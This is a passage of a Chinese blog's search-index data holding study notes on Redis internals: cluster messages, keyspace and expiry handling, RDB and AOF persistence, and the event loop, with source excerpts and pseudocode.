uint64_t currentEpoch; // 如果当前节点为主，这就是发送的配置纪元 // 如果为从，这就是发送者正在复制的主节点的配置纪元 uint64_t configEpoch; // 发送者的名字(ID) char sender[REDIS_CLUSTER_NAMELEN]; // 发送者目前的槽派信息 unsigned char myslots[REDIS_CLUSTER_SLOTS/8]; // 如果为从，就是主的名字 // 如果为主，这里记录的就是 REDIS_NODE_NULL_NAME char slaveof[REDIS_CLUSTER_NAMELEN]; // 发送者的端口号 uint16_t port; // 发送者的标识值 uint16_t flags; // 发送者所在的集群 unsigned char state; // 消息正文，也就是内容 union clusterMsgData data; }clusterMsg; union clusterMsgData{ // MEET、PING、PONG 消息的正文 struct { // 每条 MEET、PING、PONG 消息都包含两个 clusterMsgDataGossip 结构 clusterMsgDataGossip gossip[1]; }ping; // FAIL 消息的正文 struct{ clusterMsgDataFail about; }fail; // PUBLISH 消息的正文 struct{ clusterMsgDataPublish msg; }publish; // 其他消息的正文 }; clusterMsg 结构包含了一系列本节点的信息，那么接收者，就可以根据这些信息找到对应的 clusterNode结构并对其进行更新 MEET、PING、PONG消息的实现 因为这三种的正文消息都使用的 clusterMsgDataGossip 结构，所以节点通过消息头的 type 属性来判断一条消息为 MEET、PING、PONG 消息 每次发送MEET、PING、PONG消息时，发送者都会从自己已知节点列表中随机选择两个节点（可以为主，也可以为从），并将这两个节点放到两个 clusterMsgDataGossip 结构中 typedef struct{ // 节点的名字 char nodename[REDIS_CLUSTER_NAMELEN]; // 最后一次向该节点发送PING信息的时间戳 uint32_t ping_sent; // 最后一次从该节点收到 PONG 消息的时间戳 uint32_t pong_received; // 节点的IP地址 char ip[16]; // 节点的端口号 uint16_t port; // 节点的标识值 uint16_t flags; }clusterMsgDataGossip; 接收者会将接收到的 clusterMsgDataGossip 结构中记录的被选中的节点进行相应的操作： 如果被选中节点不存在于已知节点列表，那么说明接收者第一次接触到被选中节点，然后根据 IP和 port等信息，进行握手 如果存在已知的节点列表，对节点信息进行更新即可 FAIL消息的实现 当节点A认为节点B已下线时，节点A就会向集群广播一条关于节点B已经下线的FAIL消息 在节点数量比较大的情况，单纯的使用Gossip 协议来传播节点已下线信息会给节点的信息带了一定的延迟，因为Gossip 会需要一段时间后，才会传播至整个集群，而发送 FAIL 消息，可以尽快的让集群知道，从而判断集群是否要标记为下线，或者尽快进行故障转移 FAIL 消息的正文由 clusterMsgDataFail 结构进行表示，这个结构只包含一个 nodename 属性，记录已下线的节点名： typedef struct{ char nodename[REDIS_CLUSTER_NAMELEN]; }clusterMsgDataFail; PUBLISH 消息的实现 当客户端向集群中的某个节点发送命令 PUBLISH &lt;channel&gt; &lt;message&gt; 它不仅会向 channel 频道发送消息 message，还会广播一条 PUBLISH 消息，接收到的节点，也都会向 channel 频道发送 message 消息 PUBLISH 消息的正文由 clusterMsgDataPublish 结构表示 typedef struct{ uint32_t channel_len; uint32_t message_len; // 8字节是为对齐其它消息结构 // 实际的长度由保存的内容决定 unsigned char bulk_data[8]; }clusterMsgDataPublish; 其中，bulk_data 的 0channel_len-1 字节保存的为 channel 参数；channel_lenchannel_len+message_len+1 字节保存的为 message 参数 为什么不直接向节点广播 PUBLISH 命令？ 这种做法不符合Redis集群的规则，即”各节点通过发送和接收消息来进行处理通信”","categories":[{"name":"redis","slug":"redis","permalink":"https://github.com/z-anshun/categories/redis/"}],"tags":[{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"},{"name":"redis设计与实现","slug":"redis设计与实现","permalink":"https://github.com/z-anshun/tags/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"}]},{"title":"单机数据库的实现","slug":"单机数据库的实现","date":"2022-04-03T15:26:22.000Z","updated":"2022-04-05T12:52:21.684Z","comments":true,"path":"2022/04/03/dan-ji-shu-ju-ku-de-shi-xian/","link":"","permalink":"https://github.com/z-anshun/2022/04/03/dan-ji-shu-ju-ku-de-shi-xian/","excerpt":"","text":"数据库服务器中的数据库Redis 服务器将所有数据库都保存在服务器状态 redis.h/redisServer 结构的 db 数组中，db 数组的每一个项都是一个 redis.h/redisDb 结构 struct redisServer{ //... // 一个数组，保存服务器中的所有数据库 redisDb *db; // 根据dbnum来创建多少个数据库，默认为16 int dbnum; //... } 如何切换数据库？ 默认情况下，客户端的目标数据库为0号数据库，客户端可以使用 SELECT 来切换目标数据库 如： redis&gt; SER msg \"hello world\" OK redis&gt; GET msg \"hello world\" redis&gt; SELECT 2 OK redis[2]&gt; GET msg (nil) 而在服务器内部，客户端状态 redisClient 结构的db记录当前的目标数据库，其为一个redisDb的指针 typedef struct redisClient{ //... // 记录当前客户端正在使用的数据库 redisDb *db; //... }redisClient; 数据库键空间Redis 是一个键值对（key-value pair）数据库服务器，服务器中的每个数据库都由一个 redis.h/redisDb 结构表示，而其中的 dict 字典就保存了数据库中的所有键值对，这个字典也被称为了键空间 typedef struct redisDb{ //... // 数据库的键空间，保存着所有键值对 dict *dict; //... }redisDb; 键空间的key就是一个字符串对象，值就是可以是Redis中的任意一种对象 有因为键空间为一个字典，所有针对数据库的CRUD操作，实际上都是通过键空间来实现的 对键空间读写还有其它维护操作？肯定不止CRUD、还有同步和检查等 在读取一个键之后（即读和写操作），服务器都会根据键是否存在来更新服务的键空间命中（hit）次数和不命中（miss）次数（可以使用 INFO stats 命令的 keyspace_hits 属性和 keyspace_misses 属性） 服务器还会更新键的 LRU 时间（使用 OBJECT idletime 命令查看） 如果发现该键已经过期，那么服务器会先删除这个过期键 如果有客户端使用了 WATCH 命令监视了某个键，那么服务器在对被监视的键进行修改后，会将这个键标记为脏 （dirty），进而让事务注意到这个键已经被修改 每修改一个键后，都会对脏（dirty）键计数器的值+1，这个计数器会触发服务器的持久化以及复杂操作 如果服务器开启了数据库通知功能，那么在对键进行修改后，服务器会将配置发送相应的数据库通知 如何设置过期时间？ EXPIRE &lt;key&gt; &lt;ttl&gt;：将key的生存时间设置为 ttl s PEXPIRE &lt;key&gt; &lt;ttl&gt;：生存时间设置为ttl ms EXPIREAT &lt;key&gt; &lt;timestamp&gt;：将key的过期时间设置为 timestamp 所指定的秒数时间戳 PEXPIREAT &lt;key&gt; &lt;timestamp&gt;：设置为 timestamp 所指定的毫秒数时间搓 虽然上面有四种设置，实际都是使用 PEXPIREAT 实现的 比如：EXPIRE def EXPIRE(key,ttl_in_sec): ttl_in_ms=set_to_ms(ttl_in_sec) PEXPIRE(key,ttl_in_ms) def PEXPIRE(key,ttl_in_ms): now_ms=get_current_unix_timestamp_in_ms() PEXPIREAT(key,now_ms+ttl_in_ms) 如何保存过期时间？ redisDb 结构的 expires 字典保存了数据库中所有键的过期时间，这个字典也被称为 过期字典 typedef struct redisDb{ // ... // 过期字典，保存着键的过期时间 // 键为一个对象，实际中会与键空间的键指向同一个地方 // 值为 long long 类型的整数，一个毫秒精度的 UNIX 时间戳 dict *expires; // ... }redisDb; 如何移除过期时间？ PERSIST 可以移除一个键的过期时间 redis&gt; PEXPIREAT message 1391234400000 (integer) 1 redis&gt; TTL message (integer) 13893281 redis&gt; PERSIST message (integer) 1 redis&gt; TTL message (integer) -1 过期键如何判定？ 检查给定键是否存在于过期字典；如果存在，那么就会取得键的过期时间 检查当前 UNIX 时间戳是否大于键的过期时间；如果是的，那么键就过期，反之就未过期 def is_expired(key): expire_time_in_ms=redisDb.expires.get(key) if expire_time_in_ms in None: return False now_ms=get_current_unix_timestamp_in_ms() if now_ms &gt; expire_time_in_ms: return True else: return False 过期键删除策略一共有三种不同的删除策略： 定时删除：设置键的过期时间的同时，创建一个定时器（timer）。 惰性删除：放任键过期不管，每次从键空间获取值时，再去过期字典查询是否过期 定期删除：每隔一段时间，程序就对数据库进行一次检查，删除里面的过期键。 定时和定期删除都是主动删除，而惰性都是被动删除 定时删除对内存友好，但是对CPU不友好，当过期键比较多的时候，就会抢CPU资源。并且，创建一个timer需要用到 Redis 服务器种的时间事件，其实现方式为 无序链表，因此查找一个事件的时间复杂度为O(N)，并不能高效 惰性删除对 CPU 友好，但对内存不友好，过期的键，只要不被访问，就会一直占用着内存 定时删除相当于一个折中的策略，但其难点在于删除执行的时长和频率 Redis的过期键删除策略redis 服务器实际上使用 惰性删除和定期删除 两种策略；通过两种删除策略配合，服务器就可以很好的合理使用CPU 时间和避免浪费内存空间之间取得了平衡 惰性删除：redis的db.c/expireIfNeeded函数实现了惰性删除，即如果过期就删除，反之就不执行任何操作 定期删除：由 redis.c/activeExpireCycle 函数实现，每当 Redis 的服务器周期性操作 redis.c/serverCron 函数执行时，都会调用 activeExpireCycle 函数，其在规定时间内，分多次遍历服务器中的各个数据库，从数据库的 expires 字典中随机检查一部分键的过期时间，并删除 AOF、RDB和复制功能对过期键的处理 RDB文件： 生成时：执行 SAVE 或者 BGSAVE 时，程序会对数据库中的键进行检查，如果过期，就不会放入RDB,即过期键并不会对 RDB 文件造成影响 载入时：如果服务器以主服务器模式运行，那么在载入RDB文件时，程序会对文件中保存的键进行检查；如果以从服务器模式运行，那么就会全部都载入，不管过不过期。因为主从服务器同步时，从数据库都会被清空 AOF文件： 写入时：如果键未被查找到删除，就会动AOF文件。如果键被惰性或者定时删除了，也只会在AOF文件追加（append）一条DEL命令 重写时：在AOF重写时，跟RDB文件生成时类似，会对数据的键进行检查，已过期的就不会保存到重写后的AOF文件中 复制：当服务器运行在复制模式下的时候，从服务器的删除由主服务器控制，即，主服务器在删除一个过期键后，会向从服务器发送一个del；而在从服务器读到一个过期键时，也不会有惰性删除。这样就也就主服务器控制了删除，保证了主从的一致性问题 数据库通知为 Redis 2.8 新增加的功能，可以让客户端通过订阅给定的频道或者模式，来获知数据库中键的变化 分为两种 键空间通知（key-space notification）：某个键执行了什么命令，主要监听的键 键事件通知（key-event notification）：某个命令被什么键执行，主要监听的某个命令 如何发送数据库通知？ 由 notify.c/notifyKeyspaceEvent 函数实现 void notifyKeyspaceEvent(int type,char *event,robj *key,int dbid) type：当前想发送通知的类型，程序根据这个值来判断通知是否为服务器配置 notify-keyspace-events 选项所选定的通知 event：事件的名称 keys：产生事件的键 dbid：数据库号码 如：SADD 命令的一段代码 void saddCommand(redisClient *c){ //... // 如果至少有一个元素被添加成功， if (added){ //... // REDIS_NOTIFY_SET 表明这是一个集合键的通知 // ”sadd\" 表明这是 SADD 命令所产生的 notifykeyspaceEvent(REDIS_NOTIFY_SET,\"sadd\",c-&gt;argvp[1],c-&gt;db-&gt;id); //... } //... } 再如： void delCommand(redisClient *c){ int deleted=0 , j; for (j=0;j&lt;c-&gt;argc;j++){ // 尝试删除 if (dbDelete(c-&gt;db,c-&gt;argv[j])){ //... // 删除键成功，发送通知 notifyKeyspaceEvent(REDIS_NOTIFY_GENERIC,\"del\",c-&gt;agrv[j],c-&gt;db-&gt;id); //... } } //... } notifyKeyspaceEvent 函数的伪代码实现： def notifyKeyspaceEvent(type,event,key,dbid): # 不是服务器允许发送的通知 if not(server.notify_keyspace_events &amp; type): return # 键空间通知 if server.notify_keyspace_events &amp; REDIS_NOTIFY_KEYSPACE: # 将通知发送给频道 __keyspace@&lt;dbid&gt;__:&lt;key&gt; # 内容为键所发生的事件 &lt;event&gt; # 构建频道名字 chan=\"__keyspace@{dbid}__:{key}\".format{dbid=dbid,key=key} # 发送消息 pubsubPublishMessage(chan,event) # 键事件通知 if server.notify_keyspace_events &amp; REDIS_NOTIFY_KEYEVENT: # 将通知发送给频道 __keyspace@&lt;dbid&gt;__:&lt;event&gt; # 内容为键所发生的事件 &lt;key&gt; # 构建频道名字 chan=\"__keyevent@{dbid}__:{event}\".format{dbid=dbid,event=event} pubsubPublishMessage(chan,key) RDB 持久化因为 Redis 为内存数据库，将自己的数据库状态存储在内存中，需要将其保存进磁盘，否则一旦进程退出，就没了 RDB持久化既可以手动执行，也可以根据服务器的配置定期执行，将某个时间点上的数据库状态保存到一个RDB文件中。 其实，RDB持久化功能生成的RDB文件是一个经过压缩的为一个二进制文件，该文件可以还原生成对应的数据库状态 RDB 文件的创建与载入SAVE和BGSAVE 都能生成 RDB 文件 redis&gt; SAVE # 等待，直到RDB文件创建完 OK redis&gt; BGSAVE # 派生子程序，并由子程序创建RDB文件 Background saving started 伪代码实现，rbdSave函数为创建 RDB 文件的实际工作 def SAVE(): # 创建RDB 文件 rdbSave() def BGSAVE(): # 创建子进程 pid=fork() if pid==0: rdbSave() # 完成之后向父进程发送信号 signal_parent() else pid&gt;0: # 父进程继续处理命令，并轮询等待子进程的信号 handle_request_and_wait_signal() else: # 处理出错情况 handle_fork_error() 跟使用 SAVE和BGSAVE 创建 RDB 文件不同，RDB的载入是在服务启动时，自己执行的。因此并没用专门用于载入 RDB 文件的命令 注意：因为AOF文件的更新频率通常比RDB文件更高，因此如果服务器开启了AOF持久化，就会优选选择AOF，只有当其关闭时，才会使用RDB SAVE执行时，服务器的命令会被执行嘛？ 不能，因为当前服务器为阻塞的，是直接拒绝，只有当SAVE执行完后，才能重新请求 BGSAVE执行时，SAVE、BGSAVE和BGREWRITEAOF三个命令和平时有什么不同？ SAVE和BGSAVE会直接被拒绝，而 BGREWRITEAOF 命令会延迟到 BGSAVE 执行完后才执行。另外，如果 BGREWRITEAOF 正在执行， BGSAVE命令会被直接拒绝。虽然 BGSAVE和BGREWRITEAOF 在操作方面并没用什么冲突，它们两个不能同时执行是出于性能考虑，两个子进程同时执行大量的磁盘写入操作不是一个好主意 RDB 载入时，会阻塞嘛？ 会，服务器在载入 RDB 文件时，会一直处于阻塞状态 自动间隔性保存很明显，SAVE和BGSAVE的区别就是在于是否阻塞当前进程，因此，Redis允许用户配置每隔一段时间执行 BGSAVE 用户可以设置多个保存选项，只要其中一个被满足，服务器就会执行 BGSAVE 如， save 900 1 save 300 10 save 60 10000 那么，满足以下某一个，就会执行： 服务器就900s以内至少执行了一次修改 300内，至少执行了一次修改 60秒内，至少执行了10000次修改 如何实现的设置保存条件？ 首先，当用户没主动设置时，会设置默认条件，即： save 900 1 save 300 10 save 60 10000 而在代码层，服务器状态 redisServer 结构的 saveparams 属性会记录这个 struct redisServer{ //... // 记录保存条件的数组 struct saveparam *saveparams; //... }; struct saveparam{ // 秒数 time_t seconds; // 修改数 int changes; }; dirty 计数器和 lastsave 属性 dirty 计数器记录上一次成功执行 SAVE 或者 BGSAVE 服务器对数据库状态进行了多少次修改（写入、删除、更改等） lastsave 为一个时间戳，记录上一次 SAVE 或者 BGSAVE 的执行时间 struct redisServer{ // ... long long dirty; time_t lastsave; //... }; 定期 BGSAVE 时，怎么进行判断条件满足的？ Redis的周期性操作函数 serverCron 默认为100ms执行一次，该函数就会检查当前是否满足 save 选项所设置的权限，从而决定是否执行 BGSAVE def serverCron(): # ... # 遍历所有保存条件 for saveparam in server.saveparams: # 距离上次隔离多久 save_interval=unixtime_now()-server.lastsave # 次数和时间都满足，就执行保存操作 if server.dirty&gt;=saveparam.changes and save_interval &gt; saveparam.seconds: BGSAVE() # ... RDB的文件结构一个完整的 RBD文件所包含下面几个部分： REDIS | db_version | databases | EOF | check_sum REDIS：占5个字节，为 RDB 文件开头的 “REDIS” 五个字符，用于 Redis 载入时，快速判断载入文件是否为 RDB（注意：因为 RDB 为二进制文件，这里并不跟 C字符串一样，带着 ‘\\0’ 符号标识结尾） db_version：占4个字节，为一个字符串表示的整数，记录 RDB 的版本好，如”0006”，代表RDB 文件的版本为第六版 databases：包含0个或任意多个数据库，以及各个数据库中的键值对数据。如果数据库状态为空，即当前数据库为空，那么这个部门也会为空；反之就根据对应的类型，占用对应的长度 EOF：一字节，表示当前所以键值对已载入完毕 check_sum：占8字节，保存着一个校验和，根据前面四个部分的内容生成，用来判断 RDB 文件是否受损 databases部分因为databases保存的是任意多个非空数据库，所以，假设当服务器的0号数据库和3号数据库都为非空时，都会为其保存键值对 如： REDIS | db_version | database 0 | database 3 | EOF | check_sum 就表示了0号和3号数据库不为空 而每个非空数据库都可以保存 为SELECTDB、db_number、key_value_pairs 三个部分 SELECTDB | db_number | key_value_pairs SELECTDB：常量，占1字节，告诉程序接下来会读取一个数据库号码 db_number：占1、2或5个字节，表示一个数据库号码，用于服务器调用 SELECT 命令进行数据库切换 key_value_pairs：保存数据库中所有键值对数据，当然，如果键值对带有过期时间，那么保存时，也会将过期时间和键值对保存在一起 整个格式如下： REDIS | db_version | SELECTDB | 0 | pairs | SELECTDB | 3 | pairs | EOF | check_sum key_value_pairs 部分这个部门保存了一个或者以上数量的键值对，如果有过期时间的话，当然也会带上 不带过期时间的键值对在 RDB 文件中由 TYPE、key、value 三部分 TYPE | key | value TYPE：占用1字节，记录 value 类型，如：REDIS_RDB_TYPE_STRING、REDIS_RDB_TYPE_LIST等 key：总是一个字符串对象，其编码方式与 REDIS_RDB_TYPE+STRING 类型的value一样。根据其长度不同，key的长度也就会有所不同 value：保存对应的值对象 带过期时间的键值对，会新增 EXPIRETIME_MS 和 ms 字段 EXPIRETIME_MS | ms | TYPE | key | value EXPIRETIME_MS：占1字节，告知程序下一个是以毫秒为单位的过期时间 ms：8字节，表示该键的一个过期时间的时间戳 value编码 因为value跟TYPE有关，所以不同类型的保存结构也不同 字符串对象：REDIS_RDB_TYPE_STRING，编码为 REDIS_ENCODING_INT 或者 REDIS_ENCODING_RAW 如果为 整数类型，那么就可能是 REDIS_ENCODING_INT8、REDIS_ENCODING_INT16或者 REDIS_ENCODING_INT32 中的某一个，及代表使用多少位来保存 如： ENCODING | msg | REDIS_ENCODING_INT8 | 123 这里的123就占了8位 如果位为 raw 类型，那么说明保存的就是一个字符串，根据字符串的长度不同，也会有压缩和不压缩的区别 如果长度小于等于20字节，不压缩，原文保存 len | string - 如果大于20字节，会被压缩后再保存（当然是服务器打开了 RDB 文件压缩的情况下，若没有，还是原文保存） REDIS_RDB_ENC_LZF | compressed_len | origin_len | compressed_string 这里的 REDIS_RDB_FND_LZF 常量标识着该字符串已经被使用了 LZF 算法，然后程序再读入 compressed_len、origin_len和 compressed_string，就能对字符串进行解压 列表对象：TYPE 为 REDIS_RDB_TYPE_LIST，其value就是 REDIS_ENCODING_LINKEDLIST 编码的列表对象 list_length | item1 | item2 | ... | itemN 其中list_length 记录了当前列表的长度，表示当前要读几个项，为每个项开头也记录了该项得长度 | 3 | 5 | \"hello\" | 5 | \"world\" | 1 | \"!\" | 集合对象：REDIS_RDB_TYPE_SET，value保存的为 REDIS_ENCODING_HT 编码的集合对象 | set_size | elem1 | elem2 | ... | elemN | 其存储跟列表对象类似 哈希表对象：REDIS_RDB_TYPE_HASH，其 value 保存的为一个 REDIS_ENCODING_HT 编码的对象 | hash_size | key_value_pair 1 | key_value_pair 2 | ... | key_value_pair N | 其中的 hash_size 记录当前了哈希表的大小，即多少个键值对 | hash_size | key1 | v1 | key2 | v2 | ... | 2 | 1 | \"a\" | 5 | \"apple\" | 1 | \"b\" | \"6\" | \"banana\" 有序集合对象：REDIS_RDB_TYPE_ZSET， 其 value 保存的是一个 REDIS_ENCODING_SKIPLIST 编码的有序集合 | sorted_set_size | e1 | e2 | e3 | ... | eN 其中的每个元素包含了 member和score，member为字符串，socre为double INTSET 编码的集合：REDIS_RDB_TYPE_SET_INTSET，其 value 就是一个整数集合的对象，然后将其转为字符串对象，再保存 ZIPLIST 编码的列表、哈希表或者有序集合：TYPE为REDIS_RDB_TYPE_LIST_ZIPLIST、REDIS_RDB_TYPE_HASH_ZIPLIST或者REDIS_RDB_TYPE_ZSET_ZIPLIST，那么 value 就是一个压缩列表对象。其在RDB中的保存方式，也是转为字符串对象 分析RDB文件首先，执行下面命令 redis&gt; FLUSHALL # 清空数据库状态 OK redis&gt; SAVE OK $ od -c dump.rdb # ASCLL 码打印文件 0000000 R E D I S 0 0 0 6 377 334 263 C 360 Z 334 0000020 362 V 0000022 分析： 当没有任何数据时，由下面四个部分组成 5个字节的 “REDIS” 四个字节的版本号（db_version）：0006 一个字节的 EOF常量：377 八个字节的check_sum：334 263 C 360 Z 334 362 V 加一个set，即： redis&gt; FLUSHALL # 清空数据库状态 OK redis&gt; SET MSG \"HELLO\" OK redis&gt; SAVE OK $ od -c dump.rdb # ASCLL 码打印文件 0000000 R E D I S 0 0 0 6 376 \\0 \\0 003 M S G 0000020 005 H E L L O 377 207 z = 304 f T L 343 0000037 新增： 一个字节长的 SELECTDB：376 1、2或5个字节长的数据库号码（db_number）：\\0 一个或以上的键值对（key_value_pairs）：\\0 代表 TYPE类型为字符串对象，003为MSG长度 如果设置包含过期时间的键值对 redis&gt; FLUSHALL # 清空数据库状态 OK redis&gt; SET MSG 10086 \"HELLO\" OK redis&gt; SAVE OK $ od -c dump.rdb # ASCLL 码打印文件 0000000 R E D I S 0 0 0 6 376 \\0 374 \\ 2 365 336 0000020 @ 001 \\0 \\0 \\0 003 M S G 005 H E L L O 377 0000040 212 231 x 247 252 } 021 306 0000050 新增： 一个一字节长的 EXPIRETIME_MS：374 一个8字节长的过期时间ms：\\ 2 365 336 @ 001 \\0 \\0 AOF 持久化与 RDB 直接记录当前数据库状态不同，AOF为通过保存 Redis 服务器执行的写命令来记录数据库状态 并且 AOF 文件的所有命令都是以 Redis 的命令请求协议格式保存的，即纯文本格式 如： redis&gt; SET msg \"hello\" OK *2\\r\\n$6\\r\\nSELECT\\r\\n$1\\r\\n0\\r\\n *3\\r\\n$3\\r\\nSET\\r\\n$3\\r\\nmsg\\r\\n$5\\r\\nhello\\r\\n 持久化的实现AOF的持续化功能的实现，可以分为命令追加（append）、文件写入、文件同步（sync）三个步骤 命令追加 服务器在执行一个命令后，会将命令追加到服务器状态的aof_buf缓冲区的末尾 struct redisServer{ //... sds aof_buf; //... } 即将当前命令直接添加到aof_buf，跟go的append一样 写入与同步 首先服务器进程就是一个事件循环（loop），这个循环中的文件事件负责接收客户端的命令请求，以及命令回复，而时间事件就负责执行类似 serverCron函数 在服务器每次结束一个循环事件之前，它就会调用 flushAppendOnlyFile 函数，并考虑是否要将 aof_buf 写入 伪代码实现： def eventLoop(): while True: # 除了文件事件，并将请求时可能的新内容追加到 aof_buf 中 processFileEvents() # 处理时间事件 processTimeEvents() # 考虑是否要将 aof_buf 中的内容写入和保存到 AOF 文件中 flushAppendOnlyFile() flushAppednOnlyFile函数由服务器配置的 appendfsync 选项来决定 always：总是同步 everysec：每1s同步，这个由一个线程专门负责 no：由操作系统决定，何时同步 默认为everysec 注意：操作系统，在写时会先将要写入的数据放入缓存区，等其填满或者超时时，才会写入磁盘，因此，系统提供了 fsync 和 fdatasync 两个同步函数，强制将操作系统的缓冲区的数据写入到磁盘中 AOF 的三种写入的效率和安全性如何？ 根据 appendfsync 的配置的，always 最安全，但效率不行；everysec 则折中，最多丢失1s的数据；no 则无需调用 flushAppendOnlyFile 执行同步，其效率最快，不过会累计数据 AOF 如何载入和数据还原？ 创建一个不带网络连接的伪客户端（fake client）：因为 Redis 的命令只能在客户端上下文中执行，而载入AOF文件时所用的命令直接来源于 AOF 文件，而不是网络连接，所以服务器使用了一个没有网络连接的伪客户端 从AOF文件中分析并读取一条写命令 使用伪客户端执行读出的命令 直到 AOF 文件读取完毕 AOF 重写目的是减少当前 AOF 文件的体积 原理是，读取当前数据库的状态，而不是每个写入命令 伪代码实现： def aof_rewrite(new_aof_file_name): # 创建新的 AOF 文件 f=create_file(new_aof_file_name) # 遍历数据库 for db in redisServer.db: # 忽略空数据库 if db.is_empty(): continue f.write_command(\"SELECT\"+db.id) for key in db: if key.is_expired(): continue if key.type==String: rewrite_string(key) elif key.type==List: rewrite_list(key) elif key.type==Hash: rewrite_hash(key) elif key.type==Set: rewrite_set(key) elif key.type==SortedSet: rewrite_sorted_set(key) if key.have_expire_time(): rewrite_expire_time(key) f.close() def rewrite_string(key): value=GET(key) f.write_command(SET,key,value) #... def rewrite_expire_time(key): timestamp=get_expire_time_in_unixstamp(key) f.write_command(PEXPIREAT,key,timestamp) 注意：当一个列表、哈希表、集合、有序集合过长时，肯定不会直接一条命令写入也是为了避免客户端输入缓冲区溢出，会先检查键所包含的元素数量，如果超过了 redis.h/REDIS_AOF_REWRITE_ITEMS_PER_CMD 常量的值，那么就会用多条命令来记录键的值 为什么使用子进程重写？ 方便父进程继续处理命令 子进程带有服务器进程的副本，不使用线程，避免了锁，保证了数据安全 在重写时，新写入 AOF 命令如何处理？ Redis 服务器设置了一个 AOF 重写缓冲区，这个缓冲区在服务器创建子进程后开始使用。就是重写时，对于客户端发来的命令，既要写入 AOF 缓冲区，也要写入 AOF 重写缓冲区 这样就可以保证： AOF 缓冲区的内容会定期写入和同步至AOF文件，并对现有的 AOF 文件的处理工作照常 重写时的命令都会被写入到重写缓冲区 当子进程完成 AOF 重写后，会发送一个信号给父进程，然后父进程会将当前重写缓冲区的内容添加至一个新的 AOF 文件 （这个 AOF 文件保存的数据库状态跟当前服务器一样），然后再对该新 AOF 文件改名。原子地（atomic）的覆盖原AOF文件，实现新旧替换 事件Redis 服务器为一个事件驱动的程序，分为下面两类事件： 文件事件（file event）：Redis 服务器通过套接字与客户端（或其它服务器）进行连接，而文件事件就是服务器对套接字操作的抽象 时间时间（time event）：Redis 服务器中的一些操作（如 serverCron）需要在给定时间点执行，而时间事件就是服务器对这类定时操作的抽象 文件事件基于 Reactor 模式开发了自己的网络事件处理器，即 文件事件处理器（file event handler） 使用IO多路复用程序来同时监听多个套接字，并根据套接字目前执行的任务来关联不同的事件处理器 当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件 虽然文件事件处理器以单线程方式运行，但通过IO多路复用程序来监听多个套接字，既实现了高性能网络通信模型，又能很好地与 Redis 服务器中其它同样以单线程方式运行的模块对接，保存了 Redis 内部单线程设计的简单性 组成 文件事件处理器由四个部分组成，分别为套接字、IO多路复用程序、文件事件分派器（dispatcher），以及事件处理器 一个服务器肯定会出现多个套接字，那么多个文件事件就有可能并发的出现，所以IO多路复用程序会监听多个套接字，并将所有产生事件的套接字都放入一个队列中，然后通过这个队列，以有序（sequentially）、同步（synchronously）、每次一个套接字的方式向文件事件分派器传送套接字。 当一个套接字被关联的处理器处理完之后，IO多路复用才会传递下一个 IO多路复用怎么实现的？ Redis的IO多路复用程序都是通过包装常见的 select、epoll、evport和kquque这些IO多路复用函数库实现的，每个函数库在Redis源码中都是一个单独的文件，如 ae_select.c、ae_epoll.c等，所以IO多路复用的底层事可以互换的 # ifdef HAVE_EVPORT # include \"ae_evport\" # else # ifdef HAVE_EPOLL # include \"ae_epoll.c\" # else # ifdef HAVE_KQUEUE # include \"ae_kqueue.c\" # else # include \"ae_select.c\" # endif # endif # endif 如果一个套接字，既可读也可写，先后顺序如何？ 服务器会选读套接字，后写 IO多路复用程序可以监听多个套接字的 ae.h/AE_READABLE 事件和 ae.h/AE_WRITABLE 事件，并且允许同时监听 AE_READABLE 事件：当套接字变得可读时，即客户端对套接字执行write操作，或 close操作，再或者有新的可应答（acceptable）套接字出现时（客户端对服务器监听的套接字执行 connect 操作） AE_WRITABLE 事件：当套接字变得可写时，客户端对套接字执行 read 操作 对应的 API： aeCreateFileEvent：接受一个套接字描述符、一个事件类型，还有一个事件处理器。将给定套接字的事件加入到IO多路复用程序的监听范围之内，并对事件以及处理器进行关联 aeDeleteFileEvent：接受一个套接字描述符和一个事件类型，取消其监听和事件与处理器之间的关联 aeGetFileEvents：接受一个套接字描述符，返回监听的事件类型 aeWait：接受一个套接字描述符、一个事件类型和ms数，在给定时间内阻塞套接字，直到产生对应类型的时间返回，或者超时返回 aeApiPoll：接受一个 sys/time.h/struct timeval 结构作为参数，并在指定时间内，阻塞并等待所有被 aeCreateFileEvent 函数设置为监听状态的套接字产生的文件事件，直到至少一个事件产生，或超时后，函数返回 aeProcessEvents：文件事件分派器，会先调用 aeApiPoll 函数来等待事件，然后遍历所有已经产生的事件，并调用相应的事件处理器来处理这些事件 aeGetApiName：返回IO复用底层调用的函数库名，如”epoll”、”select”等 文件事件的处理器全是针对服务器而言，连接应答、命令请求和命令回复 连接应答处理器 networking.c/acceptTcpHandler 函数，Redis的连接应答处理器，用于监听套接字的客户端进行应答 当Redis服务器进行初始化时，程序会将这个连接应答处理器和服务器监听套接字的 AE_READABLE 事件关联起来，当有客户端使用 sys/socket.h/connect 函数连接服务器监听套接字的时候，套接字就会产生 AE_READABLE事件，进而引发连接应答处理器 命令请求处理器 networking.c/readQueryFromClient 函数，Redis的命令请求处理器，负责从套接字读入客户端发送的命令请求内容 命令回复处理器 networking.c/sendReplyToClient 函数，将服务器执行后得到的命令通过套接字回复 当客户端准备好接收回复时，会产生 AE_WRITEABLE 事件，引发处理器执行，当回复完后，服务器又会解除处理器与客户端套接字AE_WRITEABLE 事件的关联、 一次完整的客户端和服务器连接事件 服务器监听套接字的 AE_READABLE 事件，并且关系的处理器为连接应答处理器 Redis 客户端发起连接，监听套接字将产生 AE_READABLE 事件，触发连接应答处理器执行 处理器对客户端的连接请求进行应答，然后创建客户端套接字，以及客户端状态，并将客户端套接字的 AE_READABLE 事件与命令请求处理器关联，使得客户端可以发送请求 客户端发送一个命令请求，将产生 AE_READABLE 事件，引发请求命令处理器 执行完之后，服务器将客户端套接字的AE_WRITABLE 事件与命令回复处理器进行关联，然后客户端尝试读取命令回复，并触发相关处理器执行，写入完后，服务器解除关联 时间事件主要分为： 定时事件：让一段程序在指定的时间之后执行一次 周期事件：让一段程序每隔一段时间就执行一次 一个时间事件主要由下面三个属性组成： id：uuid，按号从小到大递增 when：事件的到达时间，毫秒精度的UNIX时间戳 timeProc：时间处理器，一个函数 什么时候为定时事件？或者什么时候为周期事件？ 取决于时间事件处理器的返回值 如果事件处理器返回 ae.h/AE_NOMORE，那么这个事件就是定时事件，到达一次之后就会被删除，之后不会再到达 